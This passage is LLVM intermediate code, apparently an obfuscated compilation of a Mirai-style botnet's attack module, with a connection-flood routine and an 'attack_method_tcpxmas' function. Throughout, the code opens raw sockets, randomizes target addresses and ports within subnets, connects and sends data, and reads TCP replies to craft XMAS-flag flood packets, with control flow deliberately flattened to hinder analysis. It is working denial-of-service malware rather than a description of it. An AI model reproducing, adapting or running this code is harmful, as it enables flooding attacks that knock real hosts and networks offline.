  %143 = select i1 %142, i32 843956999, i32 1089869152
  store i32 %143, i32* %switchVar
  br label %loopEnd

; <label>:144:                                    ; preds = %loopEntry
  %145 = call noalias i8* @calloc(i64 65535, i64 1) #7
  %146 = load i8**, i8*** %11, align 8
  %147 = load i32, i32* %10, align 4
  %148 = sext i32 %147 to i64
  %149 = getelementptr inbounds i8*, i8** %146, i64 %148
  store i8* %145, i8** %149, align 8
  %150 = load i16, i16* %13, align 2
  %151 = zext i16 %150 to i32
  %152 = icmp eq i32 %151, 65535
  %153 = select i1 %152, i32 1656016399, i32 -214118905
  store i32 %153, i32* %switchVar
  br label %loopEnd

; <label>:154:                                    ; preds = %loopEntry
  %155 = call i32 @rand_next()
  %156 = trunc i32 %155 to i16
  %157 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %158 = load i32, i32* %10, align 4
  %159 = sext i32 %158 to i64
  %160 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %157, i64 %159
  %161 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %160, i32 0, i32 0
  %162 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %161, i32 0, i32 1
  store i16 %156, i16* %162, align 2
  store i32 -1476651714, i32* %switchVar
  br label %loopEnd

; <label>:163:                                    ; preds = %loopEntry
  %164 = load i16, i16* %13, align 2
  %165 = call zeroext i16 @htons(i16 zeroext %164) #8
  %166 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %167 = load i32, i32* %10, align 4
  %168 = sext i32 %167 to i64
  %169 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %166, i64 %168
  %170 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %169, i32 0, i32 0
  %171 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %170, i32 0, i32 1
  store i16 %165, i16* %171, align 2
  store i32 -1476651714, i32* %switchVar
  br label %loopEnd

; <label>:172:                                    ; preds = %loopEntry
  %173 = call i32 @socket(i32 2, i32 2, i32 0) #7
  %174 = load i32*, i32** %12, align 8
  %175 = load i32, i32* %10, align 4
  %176 = sext i32 %175 to i64
  %177 = getelementptr inbounds i32, i32* %174, i64 %176
  store i32 %173, i32* %177, align 4
  %178 = icmp eq i32 %173, -1
  %179 = select i1 %178, i32 522703673, i32 -684187663
  store i32 %179, i32* %switchVar
  br label %loopEnd

; <label>:180:                                    ; preds = %loopEntry
  ret void

; <label>:181:                                    ; preds = %loopEntry
  %182 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 0
  store i16 2, i16* %182, align 4
  %183 = load i16, i16* %14, align 2
  %184 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %183, i16* %184, align 2
  %185 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %186 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %185, i32 0, i32 0
  store i32 0, i32* %186, align 4
  %187 = load i32*, i32** %12, align 8
  %188 = load i32, i32* %10, align 4
  %189 = sext i32 %188 to i64
  %190 = getelementptr inbounds i32, i32* %187, i64 %189
  %191 = load i32, i32* %190, align 4
  %192 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %193 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  store %struct.sockaddr* %193, %struct.sockaddr** %192, align 8
  %194 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %195 = load %struct.sockaddr*, %struct.sockaddr** %194, align 8
  %196 = call i32 @bind(i32 %191, %struct.sockaddr* %195, i32 16) #7
  %197 = icmp eq i32 %196, -1
  %198 = select i1 %197, i32 557105603, i32 101938270
  store i32 %198, i32* %switchVar
  br label %loopEnd

; <label>:199:                                    ; preds = %loopEntry
  store i32 101938270, i32* %switchVar
  br label %loopEnd

; <label>:200:                                    ; preds = %loopEntry
  %201 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %202 = load i32, i32* %10, align 4
  %203 = sext i32 %202 to i64
  %204 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %201, i64 %203
  %205 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %204, i32 0, i32 2
  %206 = load i8, i8* %205, align 4
  %207 = zext i8 %206 to i32
  %208 = icmp slt i32 %207, 32
  %209 = select i1 %208, i32 -556648802, i32 -626597406
  store i32 %209, i32* %switchVar
  br label %loopEnd

; <label>:210:                                    ; preds = %loopEntry
  %211 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %212 = load i32, i32* %10, align 4
  %213 = sext i32 %212 to i64
  %214 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %211, i64 %213
  %215 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %214, i32 0, i32 1
  %216 = load i32, i32* %215, align 4
  %217 = call i32 @ntohl(i32 %216) #8
  %218 = call i32 @rand_next()
  %219 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %220 = load i32, i32* %10, align 4
  %221 = sext i32 %220 to i64
  %222 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %219, i64 %221
  %223 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %222, i32 0, i32 2
  %224 = load i8, i8* %223, align 4
  %225 = zext i8 %224 to i32
  %226 = lshr i32 %218, %225
  %227 = add i32 %217, %226
  %228 = call i32 @htonl(i32 %227) #8
  %229 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %230 = load i32, i32* %10, align 4
  %231 = sext i32 %230 to i64
  %232 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %229, i64 %231
  %233 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %232, i32 0, i32 0
  %234 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %233, i32 0, i32 2
  %235 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %234, i32 0, i32 0
  store i32 %228, i32* %235, align 4
  store i32 -626597406, i32* %switchVar
  br label %loopEnd

; <label>:236:                                    ; preds = %loopEntry
  %237 = load i32*, i32** %12, align 8
  %238 = load i32, i32* %10, align 4
  %239 = sext i32 %238 to i64
  %240 = getelementptr inbounds i32, i32* %237, i64 %239
  %241 = load i32, i32* %240, align 4
  %242 = bitcast %union.__CONST_SOCKADDR_ARG* %22 to %struct.sockaddr**
  %243 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %244 = load i32, i32* %10, align 4
  %245 = sext i32 %244 to i64
  %246 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %243, i64 %245
  %247 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %246, i32 0, i32 0
  %248 = bitcast %struct.sockaddr_in* %247 to %struct.sockaddr*
  store %struct.sockaddr* %248, %struct.sockaddr** %242, align 8
  %249 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %22, i32 0, i32 0
  %250 = load %struct.sockaddr*, %struct.sockaddr** %249, align 8
  %251 = call i32 @connect(i32 %241, %struct.sockaddr* %250, i32 16)
  %252 = icmp eq i32 %251, -1
  %253 = select i1 %252, i32 -1078126287, i32 -1345079119
  store i32 %253, i32* %switchVar
  br label %loopEnd

; <label>:254:                                    ; preds = %loopEntry
  store i32 -1345079119, i32* %switchVar
  br label %loopEnd

; <label>:255:                                    ; preds = %loopEntry
  store i32 216914551, i32* %switchVar
  br label %loopEnd

; <label>:256:                                    ; preds = %loopEntry
  %257 = load i32, i32* %10, align 4
  %258 = add nsw i32 %257, 1
  store i32 %258, i32* %10, align 4
  store i32 2103612964, i32* %switchVar
  br label %loopEnd

; <label>:259:                                    ; preds = %loopEntry
  store i32 1053063356, i32* %switchVar
  br label %loopEnd

; <label>:260:                                    ; preds = %loopEntry
  store i32 0, i32* %10, align 4
  store i32 -830157538, i32* %switchVar
  br label %loopEnd

; <label>:261:                                    ; preds = %loopEntry
  %262 = load i32, i32* %10, align 4
  %263 = load i8, i8* %5, align 1
  %264 = zext i8 %263 to i32
  %265 = icmp slt i32 %262, %264
  %266 = select i1 %265, i32 2059749497, i32 968989821
  store i32 %266, i32* %switchVar
  br label %loopEnd

; <label>:267:                                    ; preds = %loopEntry
  %268 = load i32*, i32** %12, align 8
  %269 = load i32, i32* %10, align 4
  %270 = sext i32 %269 to i64
  %271 = getelementptr inbounds i32, i32* %268, i64 %270
  %272 = load i32, i32* %271, align 4
  %273 = load i32, i32* %10, align 4
  %274 = sext i32 %273 to i64
  %275 = getelementptr inbounds [22 x i8*], [22 x i8*]* %9, i64 0, i64 %274
  %276 = load i8*, i8** %275, align 8
  %277 = load i32, i32* %10, align 4
  %278 = sext i32 %277 to i64
  %279 = getelementptr inbounds [22 x i8*], [22 x i8*]* %9, i64 0, i64 %278
  %280 = load i8*, i8** %279, align 8
  %281 = call i64 @strlen(i8* %280) #10
  %282 = add i64 %281, 1
  %283 = call i64 @send(i32 %272, i8* %276, i64 %282, i32 16384)
  store i32 1017231818, i32* %switchVar
  br label %loopEnd

; <label>:284:                                    ; preds = %loopEntry
  %285 = load i32, i32* %10, align 4
  %286 = add nsw i32 %285, 1
  store i32 %286, i32* %10, align 4
  store i32 -830157538, i32* %switchVar
  br label %loopEnd

; <label>:287:                                    ; preds = %loopEntry
  store i32 1053063356, i32* %switchVar
  br label %loopEnd

loopEnd:                                          ; preds = %287, %284, %267, %261, %260, %259, %256, %255, %254, %236, %210, %200, %199, %181, %172, %163, %154, %144, %138, %137, %134, %131, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define signext i8 @random_hex() #0 {
  %1 = alloca [256 x i8], align 16
  %2 = alloca i32, align 4
  %3 = bitcast [256 x i8]* %1 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %3, i8* getelementptr inbounds ([256 x i8], [256 x i8]* @random_hex.hexs, i32 0, i32 0), i64 256, i32 16, i1 false)
  store i32 256, i32* %2, align 4
  %4 = call i32 @rand() #7
  %5 = load i32, i32* %2, align 4
  %6 = add nsw i32 %5, 1
  %7 = srem i32 %4, %6
  %8 = trunc i32 %7 to i8
  ret i8 %8
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #2

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #1

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #1

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #2

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #6

declare i64 @send(i32, i8*, i64, i32) #3

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: nounwind
declare i32 @rand() #1

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpxmas(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.attack_xmas_data*, align 8
  %12 = alloca i8**, align 8
  %13 = alloca i8, align 1
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca i8, align 1
  %17 = alloca i16, align 2
  %18 = alloca i8, align 1
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i32, align 4
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.sockaddr_in, align 4
  %28 = alloca %struct.sockaddr_in, align 4
  %29 = alloca i32, align 4
  %30 = alloca [256 x i8], align 16
  %31 = alloca i64, align 8
  %32 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %33 = alloca i32, align 4
  %34 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %35 = alloca %struct.tcphdr*, align 8
  %36 = alloca %struct.iphdr*, align 8
  %37 = alloca %struct.tcphdr*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca %struct.iphdr*, align 8
  %41 = alloca %struct.tcphdr*, align 8
  %42 = alloca i8*, align 8
  %43 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %44 = load i8, i8* %5, align 1
  %45 = zext i8 %44 to i64
  %46 = call noalias i8* @calloc(i64 %45, i64 16) #7
  %47 = bitcast i8* %46 to %struct.attack_xmas_data*
  store %struct.attack_xmas_data* %47, %struct.attack_xmas_data** %11, align 8
  %48 = load i8, i8* %5, align 1
  %49 = zext i8 %48 to i64
  %50 = call noalias i8* @calloc(i64 %49, i64 8) #7
  %51 = bitcast i8* %50 to i8**
  store i8** %51, i8*** %12, align 8
  %52 = load i8, i8* %7, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 2, i32 0)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %13, align 1
  %56 = load i8, i8* %7, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 3, i32 65535)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %14, align 2
  %60 = load i8, i8* %7, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 4, i32 64)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %15, align 1
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 5, i32 1)
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %16, align 1
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 7, i32 65535)
  %71 = trunc i32 %70 to i16
  store i16 %71, i16* %17, align 2
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 11, i32 1)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %18, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 12, i32 1)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %19, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 13, i32 1)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %20, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 14, i32 1)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %21, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 15, i32 1)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %22, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = call i32 @attack_get_opt_int(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 16, i32 1)
  %95 = trunc i32 %94 to i8
  store i8 %95, i8* %23, align 1
  %96 = load i8, i8* %7, align 1
  %97 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %98 = call i32 @attack_get_opt_int(i8 zeroext %96, %struct.attack_option* %97, i8 zeroext 0, i32 768)
  store i32 %98, i32* %24, align 4
  %99 = load i8, i8* %7, align 1
  %100 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %101 = call i32 @attack_get_opt_int(i8 zeroext %99, %struct.attack_option* %100, i8 zeroext 1, i32 1)
  %102 = trunc i32 %101 to i8
  store i8 %102, i8* %25, align 1
  %103 = call i32 @socket(i32 2, i32 3, i32 6) #7
  store i32 %103, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %10, align 4
  %switchVar = alloca i32
  store i32 -1591010110, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1591010110, label %first
    i32 1128102187, label %106
    i32 878257346, label %107
    i32 -789417901, label %113
    i32 -720630557, label %116
    i32 740156475, label %117
    i32 -768786463, label %123
    i32 -1401735070, label %124
    i32 1916478022, label %128
    i32 -1635248656, label %129
    i32 481354048, label %145
    i32 -575292219, label %166
    i32 470725278, label %175
    i32 -1533259484, label %180
    i32 973591513, label %185
    i32 1838287314, label %189
    i32 1590073004, label %197
    i32 -145465763, label %209
    i32 -1981295540, label %210
    i32 438843855, label %219
    i32 -1718548640, label %224
    i32 275124961, label %237
    i32 -2025297702, label %246
    i32 1461215320, label %255
    i32 -568767414, label %347
    i32 -1197172176, label %351
    i32 -1026616701, label %473
    i32 -383044223, label %482
    i32 -358556419, label %491
    i32 -411944879, label %494
    i32 1313248056, label %495
    i32 986126337, label %496
    i32 1345555399, label %497
    i32 1124592669, label %503
    i32 1416161389, label %506
    i32 -1973399813, label %507
    i32 -1303715687, label %508
    i32 -1834989551, label %511
    i32 1573087811, label %512
    i32 1011804493, label %513
    i32 2134650425, label %519
    i32 -1625676269, label %537
    i32 648500167, label %543
    i32 -813634231, label %547
    i32 461323258, label %550
    i32 -2018160118, label %622
    i32 -921495019, label %625
    i32 -1488684598, label %626
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %104 = icmp eq i32 %.reload, -1
  %105 = select i1 %104, i32 1128102187, i32 878257346
  store i32 %105, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  store i32 -1488684598, i32* %switchVar
  br label %loopEnd

; <label>:107:                                    ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  %108 = load i32, i32* %10, align 4
  %109 = bitcast i32* %9 to i8*
  %110 = call i32 @setsockopt(i32 %108, i32 0, i32 3, i8* %109, i32 4) #7
  %111 = icmp eq i32 %110, -1
  %112 = select i1 %111, i32 -789417901, i32 -720630557
  store i32 %112, i32* %switchVar
  br label %loopEnd

; <label>:113:                                    ; preds = %loopEntry
  %114 = load i32, i32* %10, align 4
  %115 = call i32 @close(i32 %114)
  store i32 -1488684598, i32* %switchVar
  br label %loopEnd

; <label>:116:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 740156475, i32* %switchVar
  br label %loopEnd

; <label>:117:                                    ; preds = %loopEntry
  %118 = load i32, i32* %9, align 4
  %119 = load i8, i8* %5, align 1
  %120 = zext i8 %119 to i32
  %121 = icmp slt i32 %118, %120
  %122 = select i1 %121, i32 -768786463, i32 -1834989551
  store i32 %122, i32* %switchVar
  br label %loopEnd

; <label>:123:                                    ; preds = %loopEntry
  store i32 -1401735070, i32* %switchVar
  br label %loopEnd

; <label>:124:                                    ; preds = %loopEntry
  %125 = call i32 @socket(i32 2, i32 1, i32 0) #7
  store i32 %125, i32* %26, align 4
  %126 = icmp eq i32 %125, -1
  %127 = select i1 %126, i32 1916478022, i32 -1635248656
  store i32 %127, i32* %switchVar
  br label %loopEnd

; <label>:128:                                    ; preds = %loopEntry
  store i32 -1303715687, i32* %switchVar
  br label %loopEnd

; <label>:129:                                    ; preds = %loopEntry
  %130 = load i32, i32* %26, align 4
  %131 = load i32, i32* %26, align 4
  %132 = call i32 (i32, i32, ...) @fcntl(i32 %131, i32 3, i32 0)
  %133 = or i32 %132, 2048
  %134 = call i32 (i32, i32, ...) @fcntl(i32 %130, i32 4, i32 %133)
  %135 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 0
  store i16 2, i16* %135, align 4
  %136 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %137 = load i32, i32* %9, align 4
  %138 = sext i32 %137 to i64
  %139 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %136, i64 %138
  %140 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %139, i32 0, i32 2
  %141 = load i8, i8* %140, align 4
  %142 = zext i8 %141 to i32
  %143 = icmp slt i32 %142, 32
  %144 = select i1 %143, i32 481354048, i32 -575292219
  store i32 %144, i32* %switchVar
  br label %loopEnd

; <label>:145:                                    ; preds = %loopEntry
  %146 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %147 = load i32, i32* %9, align 4
  %148 = sext i32 %147 to i64
  %149 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %146, i64 %148
  %150 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %149, i32 0, i32 1
  %151 = load i32, i32* %150, align 4
  %152 = call i32 @ntohl(i32 %151) #8
  %153 = call i32 @rand_next()
  %154 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %155 = load i32, i32* %9, align 4
  %156 = sext i32 %155 to i64
  %157 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %154, i64 %156
  %158 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %157, i32 0, i32 2
  %159 = load i8, i8* %158, align 4
  %160 = zext i8 %159 to i32
  %161 = lshr i32 %153, %160
  %162 = add i32 %152, %161
  %163 = call i32 @htonl(i32 %162) #8
  %164 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %165 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %164, i32 0, i32 0
  store i32 %163, i32* %165, align 4
  store i32 470725278, i32* %switchVar
  br label %loopEnd

; <label>:166:                                    ; preds = %loopEntry
  %167 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %168 = load i32, i32* %9, align 4
  %169 = sext i32 %168 to i64
  %170 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %167, i64 %169
  %171 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %170, i32 0, i32 1
  %172 = load i32, i32* %171, align 4
  %173 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %174 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %173, i32 0, i32 0
  store i32 %172, i32* %174, align 4
  store i32 470725278, i32* %switchVar
  br label %loopEnd

; <label>:175:                                    ; preds = %loopEntry
  %176 = load i16, i16* %17, align 2
  %177 = zext i16 %176 to i32
  %178 = icmp eq i32 %177, 65535
  %179 = select i1 %178, i32 -1533259484, i32 973591513
  store i32 %179, i32* %switchVar
  br label %loopEnd

; <label>:180:                                    ; preds = %loopEntry
  %181 = call i32 @rand_next()
  %182 = and i32 %181, 65535
  %183 = trunc i32 %182 to i16
  %184 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %183, i16* %184, align 2
  store i32 1838287314, i32* %switchVar
  br label %loopEnd

; <label>:185:                                    ; preds = %loopEntry
  %186 = load i16, i16* %17, align 2
  %187 = call zeroext i16 @htons(i16 zeroext %186) #8
  %188 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %187, i16* %188, align 2
  store i32 1838287314, i32* %switchVar
  br label %loopEnd

; <label>:189:                                    ; preds = %loopEntry
  %190 = load i32, i32* %26, align 4
  %191 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %192 = bitcast %struct.sockaddr_in* %27 to %struct.sockaddr*
  store %struct.sockaddr* %192, %struct.sockaddr** %191, align 8
  %193 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %194 = load %struct.sockaddr*, %struct.sockaddr** %193, align 8
  %195 = call i32 @connect(i32 %190, %struct.sockaddr* %194, i32 16)
  %196 = call i64 @time(i64* null) #7
  store i64 %196, i64* %31, align 8
  store i32 1590073004, i32* %switchVar
  br label %loopEnd

; <label>:197:                                    ; preds = %loopEntry
  store i32 16, i32* %29, align 4
  %198 = load i32, i32* %10, align 4
  %199 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %200 = bitcast %union.__CONST_SOCKADDR_ARG* %34 to %struct.sockaddr**
  %201 = bitcast %struct.sockaddr_in* %28 to %struct.sockaddr*
  store %struct.sockaddr* %201, %struct.sockaddr** %200, align 8
  %202 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %34, i32 0, i32 0
  %203 = load %struct.sockaddr*, %struct.sockaddr** %202, align 8
  %204 = call i64 @recvfrom(i32 %198, i8* %199, i64 256, i32 16384, %struct.sockaddr* %203, i32* %29)
  %205 = trunc i64 %204 to i32
  store i32 %205, i32* %33, align 4
  %206 = load i32, i32* %33, align 4
  %207 = icmp eq i32 %206, -1
  %208 = select i1 %207, i32 -145465763, i32 -1981295540
  store i32 %208, i32* %switchVar
  br label %loopEnd

; <label>:209:                                    ; preds = %loopEntry
  store i32 -1488684598, i32* %switchVar
  br label %loopEnd

; <label>:210:                                    ; preds = %loopEntry
  %211 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %28, i32 0, i32 2
  %212 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %211, i32 0, i32 0
  %213 = load i32, i32* %212, align 4
  %214 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %215 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %214, i32 0, i32 0
  %216 = load i32, i32* %215, align 4
  %217 = icmp eq i32 %213, %216
  %218 = select i1 %217, i32 438843855, i32 1345555399
  store i32 %218, i32* %switchVar
  br label %loopEnd

; <label>:219:                                    ; preds = %loopEntry
  %220 = load i32, i32* %33, align 4
  %221 = sext i32 %220 to i64
  %222 = icmp ugt i64 %221, 40
  %223 = select i1 %222, i32 -1718548640, i32 1345555399
  store i32 %223, i32* %switchVar
  br label %loopEnd

; <label>:224:                                    ; preds = %loopEntry
  %225 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %226 = getelementptr inbounds i8, i8* %225, i64 20
  %227 = bitcast i8* %226 to %struct.tcphdr*
  store %struct.tcphdr* %227, %struct.tcphdr** %35, align 8
  %228 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %229 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %228, i32 0, i32 0
  %230 = load i16, i16* %229, align 4
  %231 = zext i16 %230 to i32
  %232 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %233 = load i16, i16* %232, align 2
  %234 = zext i16 %233 to i32
  %235 = icmp eq i32 %231, %234
  %236 = select i1 %235, i32 275124961, i32 986126337
  store i32 %236, i32* %switchVar
  br label %loopEnd

; <label>:237:                                    ; preds = %loopEntry
  %238 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %239 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %238, i32 0, i32 4
  %240 = load i16, i16* %239, align 4
  %241 = lshr i16 %240, 9
  %242 = and i16 %241, 1
  %243 = zext i16 %242 to i32
  %244 = icmp ne i32 %243, 0
  %245 = select i1 %244, i32 -2025297702, i32 -1026616701
  store i32 %245, i32* %switchVar
  br label %loopEnd

; <label>:246:                                    ; preds = %loopEntry
  %247 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %248 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %247, i32 0, i32 4
  %249 = load i16, i16* %248, align 4
  %250 = lshr i16 %249, 12
  %251 = and i16 %250, 1
  %252 = zext i16 %251 to i32
  %253 = icmp ne i32 %252, 0
  %254 = select i1 %253, i32 1461215320, i32 -1026616701
  store i32 %254, i32* %switchVar
  br label %loopEnd

; <label>:255:                                    ; preds = %loopEntry
  %256 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %257 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %256, i32 0, i32 0
  %258 = load i32, i32* %257, align 4
  %259 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %260 = load i32, i32* %9, align 4
  %261 = sext i32 %260 to i64
  %262 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %259, i64 %261
  %263 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %262, i32 0, i32 0
  store i32 %258, i32* %263, align 4
  %264 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %265 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %264, i32 0, i32 2
  %266 = load i32, i32* %265, align 4
